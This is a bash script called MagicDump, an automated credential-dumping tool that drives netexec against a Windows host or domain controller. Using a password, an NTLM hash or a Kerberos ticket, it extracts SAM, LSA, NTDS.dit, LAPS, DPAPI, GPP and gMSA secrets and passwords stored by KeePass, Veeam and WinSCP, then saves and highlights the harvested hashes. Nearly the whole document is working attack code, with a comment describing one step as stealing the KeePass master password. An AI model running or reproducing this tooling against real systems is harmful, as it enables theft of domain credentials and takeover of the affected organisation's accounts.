#!/usr/bin/env bash

# Define directories
BASE_DIR="$HOME/.magicdump"
LOG_DIR="$BASE_DIR/logs"
DUMP_DIR="$BASE_DIR/dumps"

# Function to ensure a directory exists
ensure_dir_exists() {
  local dir="$1"
  if [[ ! -d "$dir" ]]; then
    mkdir -p "$dir" || {
      echo -e "${RED}[ERROR]${RESET} Failed to create directory: $dir. Check permissions."
      exit 1
    }
    [[ $VERBOSE -eq 1 ]] && echo -e "${BLUE}[DEBUG]${RESET} Created directory: $dir"
  else
    [[ $VERBOSE -eq 1 ]] && echo -e "${BLUE}[DEBUG]${RESET} Directory already exists: $dir"
  fi
}

# Function to extract DC name from Kerberos ticket
get_dc_name_from_kerberos_ticket() {
  local ccache_file="${KRB5CCNAME:-/tmp/krb5cc_$(id -u)}"  # Use KRB5CCNAME if set, otherwise default location
  if [[ ! -f "$ccache_file" ]]; then
    echo -e "${RED}[ERROR]${RESET} Kerberos ticket cache file not found at $ccache_file."
    exit 1
  fi

  # Extract DC name from the ticket
  local dc_name
  dc_name=$(klist -c "$ccache_file" | awk '/Service principal/ {getline; print $NF}' | sed 's|^cifs/||; s|@.*$||')

  if [[ -z "$dc_name" ]]; then
    echo -e "${RED}[ERROR]${RESET} Failed to extract the DC name from Kerberos ticket."
    exit 1
  fi

  echo "$dc_name"
}

# Function to validate if the DC name matches the target
validate_kerberos_target() {
  local target="$1"
  local dc_name
  dc_name=$(get_dc_name_from_kerberos_ticket)

  if [[ "$target" != "$dc_name" ]]; then
    echo -e "${RED}[ERROR]${RESET} Target DC name ($target) does not match the Kerberos ticket's DC name ($dc_name)."
    exit 1
  else
    [[ $VERBOSE -eq 1 ]] && echo -e "${GREEN}[INFO]${RESET} Target DC name matches the Kerberos ticket's DC name: $dc_name"
  fi
}

# Ensure all necessary directories exist
ensure_dir_exists "$BASE_DIR"
ensure_dir_exists "$LOG_DIR"
ensure_dir_exists "$DUMP_DIR"

# Colors
RED='\033[0;31m'
YELLOW='\033[0;33m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
CREDENTIAL_COLOR='\033[1;35m'  # Bold magenta for credentials
RESET='\033[0m'

# Dynamic banner
echo -e "${BLUE}==============================${RESET}"
echo -e "${GREEN}       MagicDump v1.0       ${RESET}"
echo -e "${BLUE}==============================${RESET}"

# Check for required tools
if ! command -v nxc &>/dev/null; then
  echo -e "${RED}[ERROR]${RESET} netexec (nxc) is not installed or not in the PATH."
  exit 1
fi
if ! command -v jq &>/dev/null; then
  echo -e "${RED}[ERROR]${RESET} jq is not installed or not in the PATH."
  exit 1
fi

# Trap to clean up temporary files on exit
trap "rm -f tmp.$$.json" EXIT

# Usage function for help
usage() {
  echo "MagicDump - Automated Windows Credential Dumping Tool"
  echo ""
  echo "Usage: $0 -t <target_ip> -u <username> [-p <password> | -H <hash> | -k [--no-pass]] [--local-auth] [-v|--verbose]"
  echo ""
  echo "Options:"
  echo "  -t, --target       Target IP address of the Windows machine"
  echo "  -u, --username     Username for authentication"
  echo "  -p, --password     Password for authentication"
  echo "  -H, --hash         NTLM hash for Pass-the-Hash authentication"
  echo "  -k, --kerberos     Use Kerberos authentication (requires a valid Kerberos ticket in KRB5CCNAME env)"
  echo "      --no-pass      Skip password/hash when using Kerberos authentication"
  echo "      --local-auth   Use local authentication"
  echo "  -v, --verbose      Enable verbose output for debugging"
  echo "  -h, --help         Show this help message and exit"
  echo ""
  echo "Examples:"
  echo "  $0 -t dc.company.com -u administrator -p 'StrongPassword123'"
  echo "  $0 -t dc.company.com -u administrator -H 'a066fbf49e79f43fffc449810227e399'"
  echo "  $0 -t dc.company.com -u administrator -p 'StrongPassword123' -k"
  echo "  KRB5CCNAME=administrator@cifs_dc.company.com@COMPANY.COM.ccache $0 -t dc.company.com -u administrator -k --no-pass"
  echo ""
  exit 0
}

# Parse arguments
TARGET_HOST=""
USERNAME=""
PASSWORD=""
HASH=""
KRB_AUTH=0   # Default: Kerberos authentication disabled
NO_PASS=0    # Default: Password or hash is required
VERBOSE=0
LOCAL_AUTH=0

while [[ $# -gt 0 ]]; do
  case "$1" in
    -t|--target)
      TARGET_HOST="$2"
      shift 2
      ;;
    -u|--username)
      USERNAME="$2"
      shift 2
      ;;
    -p|--password)
      PASSWORD="$2"
      shift 2
      ;;
    -H|--hash)
      HASH="$2"
      shift 2
      ;;
    -k|--kerberos)
      KRB_AUTH=1
      shift
      ;;
    --no-pass)
      NO_PASS=1
      shift
      ;;
    --local-auth)
      LOCAL_AUTH=1
      shift
      ;;
    -v|--verbose)
      VERBOSE=1
      shift
      ;;
    -h|--help)
      usage
      ;;
    *)
      echo -e "${RED}[ERROR]${RESET} Unknown argument: $1"
      usage
      ;;
  esac
done

# Validation logic for arguments
if [[ -z "$TARGET_HOST" || -z "$USERNAME" ]]; then
  echo -e "${RED}[ERROR]${RESET} Missing required arguments!"
  usage
fi

if [[ $NO_PASS -eq 1 ]]; then
  if [[ $KRB_AUTH -ne 1 ]]; then
    echo -e "${RED}[ERROR]${RESET} --no-pass requires Kerberos authentication (-k)."
    usage
  fi

  if [[ -n "$PASSWORD" || -n "$HASH" ]]; then
    echo -e "${RED}[ERROR]${RESET} --no-pass cannot be used with a password (-p) or hash (-H)."
    usage
  fi
fi

if [[ -n "$PASSWORD" && -n "$HASH" ]]; then
  echo -e "${RED}[ERROR]${RESET} Specify either a password (-p) or a hash (-H), but not both!"
  usage
fi

if [[ $KRB_AUTH -eq 1 ]]; then
  add_log "Using Kerberos authentication."
  validate_kerberos_target "$TARGET_HOST"
else
  if [[ -z "$PASSWORD" && -z "$HASH" ]]; then
    echo -e "${RED}[ERROR]${RESET} Either a password (-p) or a hash (-H) must be provided if not using Kerberos authentication (-k)."
    usage
  fi
fi

# Verbose mode
[[ $VERBOSE -eq 1 ]] && echo -e "${BLUE}[DEBUG]${RESET} Verbose mode enabled"
[[ $LOCAL_AUTH -eq 1 ]] && echo -e "${BLUE}[DEBUG]${RESET} Local authentication enabled (--local-auth)"

# Target-specific directories
TARGET_DUMP_DIR="$DUMP_DIR/$TARGET_HOST"
TARGET_LOG_DIR="$LOG_DIR/$TARGET_HOST"
ensure_dir_exists "$TARGET_DUMP_DIR"
ensure_dir_exists "$TARGET_LOG_DIR"

# Define log file
LOG_FILE="$TARGET_LOG_DIR/report_${TARGET_HOST}_$(date +%Y%m%d%H%M%S).json"

# Initialize JSON log
cat <<EOF > "$LOG_FILE"
{
  "target_host": "$TARGET_HOST",
  "operation_time": "$(date --utc +"%Y-%m-%dT%H:%M:%SZ")",
  "credentials_dumped": {},
  "warnings": [],
  "logs": []
}
EOF

# Function to log an operation
log_operation() {
  local category="$1"
  local status="$2"
  local details="$3"
  jq ".credentials_dumped.\"$category\" = {\"status\": \"$status\", $details}" "$LOG_FILE" > tmp.$$.json && mv tmp.$$.json "$LOG_FILE"
  echo -e "${BLUE}[LOG]${RESET} Operation: $category, Status: $status"
}

# Function to add a log entry
add_log() {
  local message="$1"
  jq ".logs += [\"$message\"]" "$LOG_FILE" > tmp.$$.json && mv tmp.$$.json "$LOG_FILE"
  echo -e "${GREEN}[INFO]${RESET} $message"
}

# Function to add a warning
add_warning() {
  local warning="$1"
  jq ".warnings += [\"$warning\"]" "$LOG_FILE" > tmp.$$.json && mv tmp.$$.json "$LOG_FILE"
  echo -e "${YELLOW}[WARNING]${RESET} $warning"
}

# Function to run a command and log it
run_command() {
  local cmd="$1"
  [[ $VERBOSE -eq 1 ]] && echo -e "${BLUE}[DEBUG]${RESET} Running command: $cmd"
  eval "$cmd"
}

# Function to construct the base command
construct_base_cmd() {
  local module="$1"
  local base_cmd="nxc $module $TARGET_HOST -u $USERNAME"

  if [[ $KRB_AUTH -eq 1 && $NO_PASS -eq 1 && -z "$KRB5CCNAME" ]]; then
    echo -e "${RED}[ERROR]${RESET} KRB5CCNAME must be set when using Kerberos ticket cache (--no-pass)."
    exit 1
  fi

  if [[ $KRB_AUTH -eq 1 ]]; then
    if [[ $NO_PASS -eq 1 ]]; then
      base_cmd="KRB5CCNAME='$KRB5CCNAME' $base_cmd --use-kcache"  # Use Kerberos ticket cache
    else
      base_cmd+=" -k"  # Use Kerberos with password
    fi
  else
    if [[ -n "$PASSWORD" ]]; then
      base_cmd+=" -p '$PASSWORD'"
    elif [[ -n "$HASH" ]]; then
      base_cmd+=" -H '$HASH'"
    fi
  fi

  [[ $LOCAL_AUTH -eq 1 ]] && base_cmd+=" --local-auth"

  [[ $VERBOSE -eq 1 ]] && echo -e "${BLUE}[DEBUG]${RESET} Constructed base command: $base_cmd"
  echo "$base_cmd"
}

# Parsing Functions
parse_sam_output() {
  local output_file="$1"
  echo -e "${GREEN}[SAM HASHES FOUND]:${RESET}"
  # Process each line that starts with "SMB"
  grep "^SMB" "$output_file" | while IFS= read -r line; do
    # Extract everything except the last field (prefix)
    prefix=$(echo "$line" | awk '{ 
      for(i=1;i<NF;i++) printf "%s ", $i; 
    }')
    # Extract the last field (credential)
    credential=$(echo "$line" | awk '{ print $NF }')
    # Print the prefix normally and the credential in the credential color
    echo -e "${prefix}${CREDENTIAL_COLOR}${credential}${RESET}"
  done
}

parse_lsa_output() {
  local output_file="$1"
  echo -e "${GREEN}[LSA SECRETS FOUND]:${RESET}"

  awk -v cred_color="${CREDENTIAL_COLOR}" -v reset="${RESET}" '
    /Dumping LSA secrets/ { secrets = 1; next }
    secrets && (/SMB.*:/ || /dpapi_[a-z]+key:/ || /NL\$KM:/) {
      # If the line begins with "SMB" and has at least 5 fields,
      # assume fields 1-4 are fixed and the credential is in field 5 onward.
      if ($1 == "SMB" && NF >= 5) {
        prefix = $1 " " $2 " " $3 " " $4 " ";
        cred = "";
        for (i = 5; i <= NF; i++) {
          cred = cred $i " ";
        }
        sub(/[[:space:]]+$/, "", cred);  # remove trailing space
        printf "  %s%s%s\n", prefix, cred_color cred, reset;
      } else {
        # Otherwise, color the whole line.
        printf "  %s%s%s\n", "", cred_color $0, reset;
      }
    }
    # When a line is encountered that does not match any expected pattern, exit.
    secrets && !(/SMB|dpapi|NL\$KM/) { exit }
  ' "$output_file" || echo -e "${YELLOW}No LSA secrets found.${RESET}"
}

# Dump Functions
dump_sam() {
  local output_file="$TARGET_DUMP_DIR/SAM_dump_${TARGET_HOST}.txt"
  local cmd
  cmd=$(construct_base_cmd "smb")" --sam > '$output_file' 2>&1"

  add_log "Starting SAM dump using netexec..."
  if run_command "$cmd"; then
    log_operation "SAM" "success" "\"file_path\": \"$output_file\""
    add_log "SAM dump saved to $output_file"
    parse_sam_output "$output_file"
  else
    log_operation "SAM" "failed" "\"error\": \"Failed to dump SAM\""
    add_warning "Failed to dump SAM on target $TARGET_HOST"
  fi
}

dump_lsa() {
  local output_file="$TARGET_DUMP_DIR/LSA_dump_${TARGET_HOST}.txt"
  local cmd
  cmd=$(construct_base_cmd "smb")" --lsa > '$output_file' 2>&1"

  add_log "Starting LSA dump using netexec..."
  if run_command "$cmd"; then
    log_operation "LSA" "success" "\"file_path\": \"$output_file\""
    add_log "LSA dump saved to $output_file"
    parse_lsa_output "$output_file"
  else
    log_operation "LSA" "failed" "\"error\": \"Failed to dump LSA\""
    add_warning "Failed to dump LSA on target $TARGET_HOST"
  fi
}

# Function to parse the NTDS output
parse_ntds_output() {
  local output_file="$1"
  echo -e "${GREEN}[NTDS HASHES FOUND]:${RESET}"

  awk -v cred_color="${CREDENTIAL_COLOR}" -v reset="${RESET}" '
    /^SMB/ {
      if (NF >= 5) {
        # Build the prefix from fields 1 to 4 (adjust if needed)
        prefix = $1 " " $2 " " $3 " " $4 " ";
        # Build the hash portion from field 5 onward
        hash = "";
        for (i = 5; i <= NF; i++) {
          hash = hash $i " ";
        }
        # Remove trailing whitespace from the hash
        sub(/[[:space:]]+$/, "", hash);
        # Print the prefix normally and the hash in the credential color, then reset the color.
        printf("%s%s%s%s\n", prefix, cred_color, hash, reset);
      } else {
        print $0;
      }
    }
  ' "$output_file"
}

# Function to execute NTDS dump using drsuapi
# https://www.netexec.wiki/smb-protocol/obtaining-credentials/dump-ntds.dit
dump_ntds() {
  # Define the output file path using TARGET_DUMP_DIR
  local output_file="$TARGET_DUMP_DIR/NTDS_dump_${TARGET_HOST}.txt"

  # Construct the base command
  local cmd
  cmd=$(construct_base_cmd "smb")" --ntds > '$output_file' 2>&1"

  # Log the operation
  add_log "Starting NTDS dump using drsuapi..."

  # Run the command with yes piped into it
  if yes | eval "$cmd > '$output_file' 2>&1"; then
    # Log success and store the output path in the JSON log
    log_operation "NTDS" "success" "\"file_path\": \"$output_file\", \"method\": \"ntdsutil\""
    add_log "NTDS dump saved to $output_file"

    # Parse and display NTDS hashes
    echo -e "${GREEN}[NTDS DUMP COMPLETED]:${RESET}"
    parse_ntds_output "$output_file"
  else
    # Log failure if the command did not succeed
    log_operation "NTDS" "failed" "\"error\": \"Failed to dump NTDS using ntdsutil\""
    add_warning "Failed to dump NTDS on target $TARGET_HOST using ntdsutil"
  fi
}

parse_laps_output() {
  local output_file="$1"
  echo -e "${GREEN}[LAPS PASSWORDS FOUND]:${RESET}"

  if grep -q "\[-\] No result found with attribute ms-MCS-AdmPwd or msLAPS-Password" "$output_file"; then
    echo -e "${YELLOW}No LAPS passwords found.${RESET}"
    return
  fi

  grep "Computer:" "$output_file" | while IFS= read -r line; do
    # Extract fields
    computer=$(echo "$line" | grep -oP "(?<=Computer:)[^ ]+")
    user=$(echo "$line" | grep -oP "(?<=User:)[^ ]*")
    password=$(echo "$line" | grep -oP "(?<=Password:).*")
    
    # Default user to 'administrator' if blank
    [[ -z "$user" ]] && user="administrator"

    echo "  Computer: $computer, User: $user, Password: $password"
  done
}

dump_laps() {
  local output_file="$TARGET_DUMP_DIR/LAPS_dump_${TARGET_HOST}.txt"
  local cmd
  cmd=$(construct_base_cmd "ldap")" -M laps > '$output_file' 2>&1"

  add_log "Starting LAPS dump using LDAP..."
  if run_command "$cmd"; then
    log_operation "LAPS" "success" "\"file_path\": \"$output_file\", \"method\": \"laps\""
    add_log "LAPS dump saved to $output_file"
    parse_laps_output "$output_file"
  else
    log_operation "LAPS" "failed" "\"error\": \"Failed to dump LAPS passwords\""
    add_warning "Failed to dump LAPS passwords on target $TARGET_HOST"
  fi
}

parse_dpapi_output() {
  local output_file="$1"
  echo -e "${GREEN}[DPAPI SECRETS FOUND]:${RESET}"

  # Ensure we remove NULL bytes (just in case)
  tr -d '\000' < "$output_file" > "${output_file}.clean"
  mv "${output_file}.clean" "$output_file"

  # Check if masterkeys were found using Perl regex (-P)
  if grep -qP "\[\+\] Got [0-9]+ decrypted masterkeys" "$output_file"; then
    masterkey_count=$(grep -oP "(?<=\[\+\] Got )[0-9]+(?= decrypted masterkeys)" "$output_file")
    echo -e "${GREEN}  -> Found $masterkey_count decrypted masterkeys.${RESET}"

    # Extract and display unique secrets
    secrets_found=0
    declare -A unique_secrets

    # Process each line carefully
    while IFS= read -r line || [[ -n "$line" ]]; do
      if [[ "$line" =~ \[SYSTEM\]\[CREDENTIAL\] ]]; then
        # Extract the relevant part of the credential using an escaped field separator
        full_credential=$(echo "$line" | awk -F '\\[SYSTEM\\]\\[CREDENTIAL\\] ' '{print $2}')

        # Ensure uniqueness
        if [[ -n "$full_credential" && -z "${unique_secrets[$full_credential]}" ]]; then
          echo -e "${CREDENTIAL_COLOR}$full_credential${RESET}"
          unique_secrets["$full_credential"]=1
          secrets_found=1
        fi
      fi
    done < "$output_file"

    if [[ $secrets_found -eq 0 ]]; then
      echo -e "${YELLOW}  No DPAPI secrets found after decrypting masterkeys.${RESET}"
    fi
  else
    echo -e "${YELLOW}  No DPAPI masterkeys or secrets found.${RESET}"
  fi
}

# Function to dump DPAPI credentials
dump_dpapi() {
  local output_file="$TARGET_DUMP_DIR/DPAPI_dump_${TARGET_HOST}.txt"
  local cmd
  cmd=$(construct_base_cmd "smb")" --dpapi > '$output_file' 2>&1"

  add_log "Starting DPAPI dump..."
  if run_command "$cmd"; then
    log_operation "DPAPI" "success" "\"file_path\": \"$output_file\""
    add_log "DPAPI dump saved to $output_file"
    parse_dpapi_output "$output_file"
  else
    log_operation "DPAPI" "failed" "\"error\": \"Failed to dump DPAPI credentials\""
    add_warning "Failed to dump DPAPI credentials on target $TARGET_HOST"
  fi
}

# Function to dump Group Policy Preferences (GPP) passwords
dump_gpp() {
  local output_file="$TARGET_DUMP_DIR/GPP_dump_${TARGET_HOST}.txt"

  add_log "Starting GPP dump..."

  local cmd_autologin
  cmd_autologin=$(construct_base_cmd "smb")" -M gpp_autologin >> '$output_file' 2>&1"
  if run_command "$cmd_autologin"; then
    log_operation "GPP Autologin" "success" "\"file_path\": \"$output_file\""
  else
    add_warning "Failed to dump GPP autologin credentials on target $TARGET_HOST"
  fi

  local cmd_password
  cmd_password=$(construct_base_cmd "smb")" -M gpp_password >> '$output_file' 2>&1"
  if run_command "$cmd_password"; then
    log_operation "GPP Password" "success" "\"file_path\": \"$output_file\""
  else
    add_warning "Failed to dump GPP passwords on target $TARGET_HOST"
  fi

  add_log "GPP dump saved to $output_file"
}

# Function to dump gMSA credentials
dump_gmsa() {
  local output_file="$TARGET_DUMP_DIR/gMSA_dump_${TARGET_HOST}.txt"

  add_log "Starting gMSA credential dump..."
  local cmd
  cmd=$(construct_base_cmd "ldap")" --gmsa > '$output_file' 2>&1"

  if run_command "$cmd"; then
    log_operation "gMSA" "success" "\"file_path\": \"$output_file\""
    add_log "gMSA credentials dump saved to $output_file"
  else
    log_operation "gMSA" "failed" "\"error\": \"Failed to dump gMSA credentials\""
    add_warning "Failed to dump gMSA credentials on target $TARGET_HOST"
    return  # Exit if no gMSA accounts found
  fi

  # Step 2: Extract gMSA IDs from the dump file and convert them automatically
  grep -oP '\b[a-f0-9]{64}\b' "$output_file" | while IFS= read -r gmsa_id; do
    if [[ -n "$gmsa_id" ]]; then
      local id_output="$TARGET_DUMP_DIR/gMSA_ID_Conversion_${TARGET_HOST}.txt"
      add_log "Converting gMSA ID: $gmsa_id..."
      local cmd_id
      cmd_id=$(construct_base_cmd "ldap")" --gmsa-convert-id $gmsa_id > '$id_output' 2>&1"

      if run_command "$cmd_id"; then
        log_operation "gMSA Convert ID" "success" "\"file_path\": \"$id_output\""
        add_log "gMSA ID conversion saved to $id_output"
      else
        add_warning "Failed to convert gMSA ID: $gmsa_id"
      fi
    fi
  done

  # Step 3: Extract encrypted LSA secrets and attempt decryption automatically
  grep -oP "_SC_GMSA_\{[A-F0-9-]+\}_[a-f0-9]{64}:.*" "$output_file" | while IFS= read -r encrypted_lsa; do
    if [[ -n "$encrypted_lsa" ]]; then
      local lsa_output="$TARGET_DUMP_DIR/gMSA_LSA_Decryption_${TARGET_HOST}.txt"
      add_log "Decrypting gMSA LSA data..."
      local cmd_lsa
      cmd_lsa=$(construct_base_cmd "ldap")" --gmsa-decrypt-lsa '$encrypted_lsa' > '$lsa_output' 2>&1"

      if run_command "$cmd_lsa"; then
        log_operation "gMSA LSA Decrypt" "success" "\"file_path\": \"$lsa_output\""
        add_log "gMSA LSA decryption saved to $lsa_output"
      else
        add_warning "Failed to decrypt gMSA LSA data."
      fi
    fi
  done
}

# Function to check if keepass is installed, to steal the master password and decrypt the keepass database 
dump_keepass() {
  local output_file="$TARGET_DUMP_DIR/KeePass_Discovery_${TARGET_HOST}.txt"

  add_log "Starting KeePass discovery..."
  local cmd_discover
  cmd_discover=$(construct_base_cmd "smb")" -M keepass_discover > '$output_file' 2>&1"

  if run_command "$cmd_discover"; then
    log_operation "KeePass_Discovery" "success" "\"file_path\": \"$output_file\", \"method\": \"keepass_discover\""
    add_log "KeePass discovery results saved to $output_file"

    # Step 2: Extract KeePass config path from the discovery output
    local keepass_path
    keepass_path=$(grep -oP '(?<=KeePass config path: ).*' "$output_file" | head -n 1)

    if [[ -n "$keepass_path" ]]; then
      add_log "KeePass config found at: $keepass_path"
      local output_decrypt="$TARGET_DUMP_DIR/KeePass_Dump_${TARGET_HOST}.txt"

      # Step 3: Trigger KeePass dump using extracted config path
      local cmd_trigger
      cmd_trigger=$(construct_base_cmd "smb")" -M keepass_trigger -o KEEPASS_CONFIG_PATH='$keepass_path' > '$output_decrypt' 2>&1"

      if run_command "$cmd_trigger"; then
        log_operation "KeePass_Dump" "success" "\"file_path\": \"$output_decrypt\", \"method\": \"keepass_trigger\""
        add_log "KeePass dump saved to $output_decrypt"
      else
        log_operation "KeePass_Dump" "failed" "\"error\": \"Failed to dump KeePass database\""
        add_warning "Failed to dump KeePass database on target $TARGET_HOST"
      fi
    else
      add_warning "KeePass installation detected, but no config path found!"
    fi
  else
    log_operation "KeePass_Discovery" "failed" "\"error\": \"KeePass not found or unable to discover\""
    add_warning "KeePass not found on target $TARGET_HOST"
  fi
}

# Function to dump passwords used by Veeam for backup jobs
dump_veeam() {
  local output_file="$TARGET_DUMP_DIR/Veeam_Credentials_${TARGET_HOST}.txt"

  add_log "Starting Veeam password dump..."
  local cmd
  cmd=$(construct_base_cmd "smb")" -M veeam > '$output_file' 2>&1"

  if run_command "$cmd"; then
    log_operation "Veeam_Credentials" "success" "\"file_path\": \"$output_file\", \"method\": \"veeam\""
    add_log "Veeam credentials saved to $output_file"
  else
    log_operation "Veeam_Credentials" "failed" "\"error\": \"Failed to dump Veeam passwords\""
    add_warning "Failed to dump Veeam passwords on target $TARGET_HOST"
  fi
}

# Function to dump WinSCP Credentials stored in the registry or local files
dump_winscp() {
  local output_file="$TARGET_DUMP_DIR/WinSCP_Credentials_${TARGET_HOST}.txt"

  add_log "Starting WinSCP credential dump..."
  local cmd
  cmd=$(construct_base_cmd "smb")" -M winscp > '$output_file' 2>&1"

  if run_command "$cmd"; then
    log_operation "WinSCP_Credentials" "success" "\"file_path\": \"$output_file\", \"method\": \"winscp\""
    add_log "WinSCP credentials saved to $output_file"
  else
    log_operation "WinSCP_Credentials" "failed" "\"error\": \"Failed to dump WinSCP passwords\""
    add_warning "Failed to dump WinSCP passwords on target $TARGET_HOST"
  fi
}

# Function to dump PuTTY private Keys stored for authentication or stored proxy credentials
dump_putty() {
  local output_file="$TARGET_DUMP_DIR/PuTTY_Credentials_${TARGET_HOST}.txt"

  add_log "Starting PuTTY credential & private key dump..."
  local cmd
  cmd=$(construct_base_cmd "smb")" -M putty > '$output_file' 2>&1"

  if run_command "$cmd"; then
    log_operation "PuTTY_Credentials" "success" "\"file_path\": \"$output_file\", \"method\": \"putty\""
    add_log "PuTTY credentials and private keys saved to $output_file"
  else
    log_operation "PuTTY_Credentials" "failed" "\"error\": \"Failed to dump PuTTY credentials\""
    add_warning "Failed to dump PuTTY credentials on target $TARGET_HOST"
  fi
}

# Function to dump VNC password from RealVNC or TightVNC
dump_vnc() {
  local output_file="$TARGET_DUMP_DIR/VNC_Credentials_${TARGET_HOST}.txt"

  add_log "Starting VNC password dump..."
  local cmd
  cmd=$(construct_base_cmd "smb")" -M vnc > '$output_file' 2>&1"

  if run_command "$cmd"; then
    log_operation "VNC_Credentials" "success" "\"file_path\": \"$output_file\", \"method\": \"vnc\""
    add_log "VNC passwords saved to $output_file"
  else
    log_operation "VNC_Credentials" "failed" "\"error\": \"Failed to dump VNC passwords\""
    add_warning "Failed to dump VNC passwords on target $TARGET_HOST"
  fi
}

# Function to dump mRemoteNG stored credentials
dump_mremoteng() {
  local output_file="$TARGET_DUMP_DIR/mRemoteNG_Credentials_${TARGET_HOST}.txt"

  add_log "Starting mRemoteNG credential dump..."
  local cmd
  cmd=$(construct_base_cmd "smb")" -M mremoteng > '$output_file' 2>&1"

  if run_command "$cmd"; then
    log_operation "mRemoteNG_Credentials" "success" "\"file_path\": \"$output_file\", \"method\": \"mremoteng\""
    add_log "mRemoteNG credentials saved to $output_file"
  else
    log_operation "mRemoteNG_Credentials" "failed" "\"error\": \"Failed to dump mRemoteNG passwords\""
    add_warning "Failed to dump mRemoteNG passwords on target $TARGET_HOST"
  fi
}

# Function to dump Remote Desktop Connection Manager credentials
dump_rdcman() {
  local output_file="$TARGET_DUMP_DIR/RDCMan_Credentials_${TARGET_HOST}.txt"

  add_log "Starting RDCMan credential dump..."
  local cmd
  cmd=$(construct_base_cmd "smb")" -M rdcman > '$output_file' 2>&1"

  if run_command "$cmd"; then
    log_operation "RDCMan_Credentials" "success" "\"file_path\": \"$output_file\", \"method\": \"rdcman\""
    add_log "RDCMan credentials saved to $output_file"
  else
    log_operation "RDCMan_Credentials" "failed" "\"error\": \"Failed to dump RDCMan credentials\""
    add_warning "Failed to dump RDCMan credentials on target $TARGET_HOST"
  fi
}

# Function do dump wifi passwords
dump_wifi_passwords() {
  local output_file="$TARGET_DUMP_DIR/WiFi_Passwords_${TARGET_HOST}.txt"

  add_log "Starting Wi-Fi password dump..."
  local cmd
  cmd=$(construct_base_cmd "smb")" -M wifi > '$output_file' 2>&1"

  if run_command "$cmd"; then
    log_operation "WiFi_Passwords" "success" "\"file_path\": \"$output_file\", \"method\": \"wifi\""
    add_log "Wi-Fi passwords saved to $output_file"
  else
    log_operation "WiFi_Passwords" "failed" "\"error\": \"Failed to dump Wi-Fi passwords\""
    add_warning "Failed to dump Wi-Fi passwords on target $TARGET_HOST"
  fi
}

# Function to dump SCCM
dump_sccm() {
  local output_file="$TARGET_DUMP_DIR/SCCM_dump_${TARGET_HOST}.txt"

  add_log "Starting SCCM dump (disk method)..."
  local cmd
  cmd=$(construct_base_cmd "smb")" --sccm > '$output_file' 2>&1"

  if run_command "$cmd"; then
    log_operation "SCCM" "success" "\"file_path\": \"$output_file\", \"method\": \"disk\""
    add_log "SCCM dump (disk) saved to $output_file"
  else
    add_warning "SCCM disk dump failed. Trying WMI method..."
    
    # Attempt WMI method
    local cmd_wmi
    cmd_wmi=$(construct_base_cmd "smb")" --sccm wmi > '$output_file' 2>&1"

    if run_command "$cmd_wmi"; then
      log_operation "SCCM" "success" "\"file_path\": \"$output_file\", \"method\": \"wmi\""
      add_log "SCCM dump (wmi) saved to $output_file"
    else
      log_operation "SCCM" "failed" "\"error\": \"Failed to dump SCCM credentials\""
      add_warning "Failed to dump SCCM credentials on target $TARGET_HOST"
    fi
  fi
}

# Function to dump access token for Azure and Microsoft 365 from Token Broker Cache.
dump_token_cache() {
  local output_file="$TARGET_DUMP_DIR/TokenBrokerCache_${TARGET_HOST}.txt"

  add_log "Starting Token Broker Cache dump..."
  local cmd
  cmd=$(construct_base_cmd "smb")" -M wam > '$output_file' 2>&1"

  if run_command "$cmd"; then
    log_operation "TokenBrokerCache" "success" "\"file_path\": \"$output_file\", \"method\": \"wam\""
    add_log "Token Broker Cache dump saved to $output_file"
  else
    add_warning "Failed to dump Token Broker Cache using default method."
  fi

  # Step 2: Attempt decryption with DPAPI master keys
  if [[ -f "masterkeys.txt" ]]; then
    add_log "Attempting DPAPI decryption with masterkeys.txt..."
    local cmd_mk
    cmd_mk=$(construct_base_cmd "smb")" -M wam --mkfile masterkeys.txt >> '$output_file' 2>&1"

    if run_command "$cmd_mk"; then
      log_operation "TokenBrokerCache Decrypt" "success" "\"file_path\": \"$output_file\", \"method\": \"wam --mkfile\""
      add_log "Decrypted tokens saved to $output_file"
    else
      add_warning "Failed to decrypt Token Broker Cache using masterkeys.txt"
    fi
  fi

  # Step 3: Attempt decryption with a private key backup
  if [[ -f "domain_backup_key.pvk" ]]; then
    add_log "Attempting decryption with domain_backup_key.pvk..."
    local cmd_pvk
    cmd_pvk=$(construct_base_cmd "smb")" -M wam --pvk domain_backup_key.pvk >> '$output_file' 2>&1"

    if run_command "$cmd_pvk"; then
      log_operation "TokenBrokerCache Decrypt" "success" "\"file_path\": \"$output_file\", \"method\": \"wam --pvk\""
      add_log "Decrypted tokens saved to $output_file"
    else
      add_warning "Failed to decrypt Token Broker Cache using domain_backup_key.pvk"
    fi
  fi
}

# Main Logic
add_log "Starting MagicDump against target $TARGET_HOST"
add_log "Authenticating as user '$USERNAME'..."
echo -e "\n"
echo -e "\e[1;32m----------------------------------------------------------------------------------------------------------------------\e[0m"
dump_sam
echo -e "\e[1;32m----------------------------------------------------------------------------------------------------------------------\e[0m"

echo -e "\n"
echo -e "\e[1;32m----------------------------------------------------------------------------------------------------------------------\e[0m"
dump_lsa
echo -e "\e[1;32m----------------------------------------------------------------------------------------------------------------------\e[0m"

echo -e "\n"
echo -e "\e[1;32m----------------------------------------------------------------------------------------------------------------------\e[0m"
dump_ntds
echo -e "\e[1;32m----------------------------------------------------------------------------------------------------------------------\e[0m"

echo -e "\n"
echo -e "\e[1;32m----------------------------------------------------------------------------------------------------------------------\e[0m"
dump_laps
echo -e "\e[1;32m----------------------------------------------------------------------------------------------------------------------\e[0m"

echo -e "\n"
echo -e "\e[1;32m----------------------------------------------------------------------------------------------------------------------\e[0m"
dump_dpapi
echo -e "\e[1;32m----------------------------------------------------------------------------------------------------------------------\e[0m"

echo -e "\n"
echo -e "\e[1;32m----------------------------------------------------------------------------------------------------------------------\e[0m"
dump_gpp
echo -e "\e[1;32m----------------------------------------------------------------------------------------------------------------------\e[0m"

echo -e "\n"
echo -e "\e[1;32m----------------------------------------------------------------------------------------------------------------------\e[0m"
dump_gmsa
echo -e "\e[1;32m----------------------------------------------------------------------------------------------------------------------\e[0m"

echo -e "\n"
echo -e "\e[1;32m----------------------------------------------------------------------------------------------------------------------\e[0m"
dump_keepass
echo -e "\e[1;32m----------------------------------------------------------------------------------------------------------------------\e[0m"

echo -e "\n"
echo -e "\e[1;32m----------------------------------------------------------------------------------------------------------------------\e[0m"
dump_veeam
echo -e "\e[1;32m----------------------------------------------------------------------------------------------------------------------\e[0m"

echo -e "\n"
echo -e "\e[1;32m----------------------------------------------------------------------------------------------------------------------\e[0m"
dump_winscp
echo -e "\e[1;32m----------------------------------------------------------------------------------------------------------------------\e[0m"

echo -e "\n"
